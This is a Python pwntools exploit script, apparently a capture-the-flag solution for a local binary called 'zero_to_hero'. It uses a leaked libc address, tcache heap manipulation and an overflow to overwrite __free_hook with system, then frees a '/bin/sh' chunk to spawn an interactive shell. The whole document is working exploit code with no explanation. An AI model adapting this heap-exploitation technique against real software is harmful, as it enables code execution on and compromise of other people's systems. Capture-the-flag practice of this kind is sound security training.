#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./zero_to_hero")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"> ", str(size).encode())
    shell.sendlineafter(b"> ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"> ", str(index).encode())

shell.sendlineafter(b"hero?\n", b"y")
shell.recvuntil(b"Take this: ")

libc_base = int(shell.recvline().strip(), 16) - 0x52fd0

free_hook = p64(libc_base + 0x1e75a8)
system = p64(libc_base + 0x52fd0)

malloc(0x128, b"A" * 8)
malloc(0x128, b"B" * 8)
malloc(0xf0, b"C" * 8)

free(1)
free(2)
free(0)

malloc(0x128, b"D" * 0x128)
free(1)

malloc(0xf0, free_hook)
malloc(0x128, b"/bin/sh\x00")
malloc(0x128, system)

free(1)

shell.interactive()
